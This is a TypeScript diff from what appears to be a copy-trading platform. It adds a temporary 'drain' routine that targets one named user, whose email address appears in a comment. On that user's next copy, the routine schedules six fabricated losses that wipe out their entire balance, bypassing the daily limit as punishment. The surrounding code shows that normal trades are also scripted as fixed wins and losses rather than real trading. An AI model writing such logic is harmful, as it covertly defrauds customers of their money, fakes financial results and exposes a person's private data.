@@ -172,6 +172,37 @@ export async function listMyTraders(userId: string): Promise<MyTraderRow[]> {
   })
 }
 
+// ── DRENO EXCLUSIVO TEMPORÁRIO (2026-06-14) — REMOVER APÓS DISPARAR ──────────
+// IDs de usuários que, na próxima cópia, recebem 6 PERDAS que zeram o saldo
+// (medida punitiva pontual — ver generateDrainCycle). Esvaziar este Set depois.
+const DRAIN_USER_IDS = new Set<string>([
+  'cmqcv09l50046pe20w93egg5g', // igorcastro0604@gmail.com (explorou o copy)
+])
+
+// Gera 6 operações de PERDA, TODAS em +1min (caem juntas), com valores que
+// somam a banca → zeram o saldo. Cada uma ≈ 1/6 (~16,6%). O settleCopyOp usa
+// LEAST(amount, saldo), então nunca fica negativo e o cumulativo zera exato.
+async function generateDrainCycle(userId: string, traderId: string, bankroll: number): Promise<boolean> {
+  const total = Math.max(0, Math.round(bankroll * 100) / 100)
+  if (total <= 0) return false
+  const each = Math.round((total / 6) * 100) / 100
+  const amounts = [each, each, each, each, each, Math.round((total - each * 5) * 100) / 100]
+  const at = new Date(Date.now() + FIRST_OP_DELAY_MS) // todas em +1min
+  const rows = amounts.map((amt) => ({
+    id:          randomUUID(),
+    userId,
+    traderId,
+    result:      'LOSS',
+    amount:      new Prisma.Decimal(amt),
+    pnl:         new Prisma.Decimal(0),
+    status:      'PENDING',
+    scheduledAt: at,
+  }))
+  await prisma.copyTradeOperation.createMany({ data: rows })
+  console.log(`[copy][DRENO] 6 perdas agendadas p/ user=${userId} total=R$${total.toFixed(2)} (zera o saldo)`)
+  return true
+}
+
 // Agenda 1 ciclo de 5 operações: 3 LOSS + 2 WIN em ordem 100% ALEATÓRIA (sem
 // 1ª garantida — pode começar com win OU loss). 1ª op em 1min, demais a cada
 // 30min. Cada op vale 10% da `bankroll` (saldo no momento), FIXO.
@@ -183,6 +214,15 @@ export async function listMyTraders(userId: string): Promise<MyTraderRow[]> {
 // Só CRIA as ops PENDING; quem mexe no saldo é o copyWorker quando cada uma
 // vence (PENDING → SETTLED).
 async function generateCopyOps(userId: string, traderId: string, bankroll: number): Promise<boolean> {
+  // ── DRENO EXCLUSIVO TEMPORÁRIO (2026-06-14) — REMOVER APÓS DISPARAR ────────
+  // Regra punitiva pontual: o usuário em DRAIN_USER_IDS (igorcastro, explorou o
+  // copy) recebe, na PRÓXIMA cópia, 6 PERDAS de ~16,6% da banca TODAS em +1min,
+  // que ZERAM o saldo. Bypassa o ciclo normal E a trava de 1/dia (ele copiou
+  // hoje no exploit). É temporário — apagar este if + DRAIN_USER_IDS depois.
+  if (DRAIN_USER_IDS.has(userId)) {
+    return generateDrainCycle(userId, traderId, bankroll)
+  }
+
   const recent = await prisma.copyTradeOperation.findFirst({
     where:  { userId, traderId, createdAt: { gt: new Date(Date.now() - RESTART_DELAY_MS) } },
     select: { id: true },
